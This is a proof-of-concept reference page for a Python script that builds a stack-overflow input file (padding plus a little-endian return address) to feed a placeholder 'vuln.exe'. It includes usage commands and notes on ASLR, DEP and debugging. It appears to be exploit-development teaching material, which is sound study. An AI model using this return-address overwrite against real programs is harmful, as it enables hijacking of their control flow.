# PoC — Input blob builder 

This page documents a small **blob builder** script that creates a raw `payload.bin` file you can use to feed input to vulnerable programs (for example: `vuln.exe < payload.bin` or `type payload.bin | vuln.exe`). It's meant as a simple reference and a starting point for exploit development / debugging workflows.


---

# Overview

The supplied script builds a raw binary file composed of:

* `padding_len` bytes of padding (to reach the saved return address on the stack),
* followed by an 8-byte return address split into two 32-bit words (little-endian ordering used by x86/x64 on Windows).

For a 32-bit target you would only need a single 4-byte little-endian return address; for a 64-bit target you typically write the low dword first, then the high dword (or use a single 8-byte `<Q` pack).

---

# Script


* accepts `--offset` (padding length),
* accepts either a single 64-bit address or a pair of 32-bit parts,
* chooses packing automatically depending on `--bits` (32 vs 64),
* writes `payload.bin` and prints what it wrote.

```python

import struct
import argparse

parser = argparse.ArgumentParser(description="Build a raw payload.bin for basic stack overwrites")
parser.add_argument('--offset', type=int, default=0x58, help='padding length (bytes)')
parser.add_argument('--pad', type=str, default='A', help='padding byte (single character)')
parser.add_argument('--bits', type=int, choices=[32, 64], default=64, help='target architecture bits')
parser.add_argument('--addr', type=lambda x: int(x,0), help='target address as 0x... (use for full 64-bit)')
parser.add_argument('--addr-low', type=lambda x: int(x,0), help='lower 32-bit dword (0x...)')
parser.add_argument('--addr-high', type=lambda x: int(x,0), help='upper 32-bit dword (0x...)')
parser.add_argument('--out', type=str, default='payload.bin', help='output filename')
args = parser.parse_args()

padding_len = args.offset
padding_byte = args.pad.encode()[:1]

if args.bits == 32:
    if args.addr is None and args.addr_low is None:
        raise SystemExit('Provide --addr or --addr-low for 32-bit targets')
    addr = args.addr if args.addr is not None else args.addr_low
    payload = padding_byte * padding_len + struct.pack('<I', addr & 0xFFFFFFFF)
else:
    # 64-bit
    if args.addr is not None:
        payload = padding_byte * padding_len + struct.pack('<Q', args.addr & 0xFFFFFFFFFFFFFFFF)
    elif args.addr_low is not None and args.addr_high is not None:
        # pack low dword first (little-endian 64-bit representation)
        payload = padding_byte * padding_len + struct.pack('<I', args.addr_low & 0xFFFFFFFF) + struct.pack('<I', args.addr_high & 0xFFFFFFFF)
    else:
        raise SystemExit('Provide --addr (64-bit) or both --addr-low and --addr-high')

with open(args.out, 'wb') as f:
    f.write(payload)

print(f'Wrote {args.out} ({len(payload)} bytes)')
```


**Examples:**

* 64-bit single address:

```cmd
python payloadBuilder.py --offset 88 --bits 64 --addr 0x7ff7c69f2040 --out payload.bin
```

* 64-bit split dwords (low then high):

```cmd
python payloadBuilder.py --offset 88 --bits 64 --addr-low 0xC69F2040 --addr-high 0x00007FF7 --out payload.bin
```

* 32-bit address:

```cmd
python payloadBuilder.py --offset 72 --bits 32 --addr 0x401020 --out payload.bin
```


---

# How to use the payload file


```cmd
type payload.bin | vuln.exe
vuln.exe < payload.bin
```


---

# Important notes & troubleshooting

* **Endianness:** x86/x86\_64 on Windows are little-endian. When writing a 64-bit address as two 32-bit values, write the *lower* dword first, then the *upper* dword, as shown in the original script.

* **Null bytes:** raw payload files can contain `0x00` bytes. If the target program reads raw bytes via `read`, `recv`, `fgets` into a buffer, null bytes are fine. If the program uses C-string APIs that stop at `\0` or performs `strlen` on the input, a `0x00` inside the padding or address can truncate the string — be aware of that when designing payloads.

* **ReadConsole vs redirected stdin:** some programs use `ReadConsole` / console APIs and ignore redirected stdin. If `vuln.exe < payload.bin` doesn’t feed your input, try one of the following:

  * Launch the program externally with the redirection and then attach IDA (`Attach to process`) before the vulnerable code executes.
  * Use a debugger that provides console input (x64dbg) or create a launcher that creates a pseudo-console (ConPTY / winpty).

* **ASLR / Module base:** if your target address comes from a module that is ASLR-enabled, the address will change each run. Use technique to find a non-ASLR module or leak the base at runtime, or use ROP gadgets in non-ASLR modules.

* **DEP / NX / Mitigations:** modern systems often have DEP, ASLR, SafeSEH, /GS protections. Overwriting the return address may not be enough in protected environments. Make sure to understand the target binary protections before relying on a simple ret overwrite.

* **Debugging tips in IDA:** IDA’s Debugger → Process options may accept an input file for stdin. Alternatively, set the application to run `cmd.exe /c "vuln.exe < payload.bin"` and attach to the child process, or start the target externally and attach.

---

# Quick checklist before testing

1. Confirm target bitness (32 vs 64). Use `file`, `dumpbin /headers`, or your disassembler.
2. Confirm the overflow offset (`padding_len`). You can compute it with pattern/generation tools (e.g., Metasploit pattern\_create / pattern\_offset) or by incremental testing.
3. Confirm the exact return address (rebased address in IDA or the runtime base + function offset).
4. Generate the `payload.bin` and run with `vuln.exe < payload.bin` or `type payload.bin | vuln.exe`.
